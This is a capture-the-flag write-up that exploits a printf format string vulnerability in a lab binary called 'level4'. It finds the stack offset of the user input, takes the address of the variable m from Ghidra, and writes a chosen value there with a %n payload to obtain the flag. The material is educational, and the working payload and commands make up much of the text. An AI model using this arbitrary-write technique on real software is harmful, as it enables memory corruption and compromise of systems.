We have a binary similar to that of the previous level: the main contains a function n(), which calls for fgets(local_20c), p(local_20c) function which uses printf.
To get the flag **the variable m must be equal to 0x1025544, that is to say 16930116 in decimal.** Let's exploit the format string vulnerability:

1. Check the stack's position of our input:

```
python -c 'print("AAAA " + "%x " * 20)' | ./level4
AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 
```

41414141 is AAAA in hexadecimal, so our input is displayed at the **12th position** in the binary's stack.

2. Get the address of m in Ghidra:

```
08049810 m
```

This address costs 4 bytes, so 16930116 - 4 = 16930112 bytes still needed to get the correct value.

3. Let's attack:

```
python -c 'print("\x10\x98\x04\x08" + "%16930112x%12$n")' > /var/crash/attack
cat /var/crash/attack - | ./level4
```

The command means:
- `\x10\x98\x04\x08` is the address of m in little-endian
- `%x` displays a number in hexadecimal. Since we have the address of m, which is 4 bytes, we are left with 16930116 - 4 = 16930112 bytes to write
- `12$` means the twelfth position / argument
- `%n` will assign to the pointer the number of character written so far, so 4 + 16930112 = 16930116 bytes

We now have the flag to go to the next level.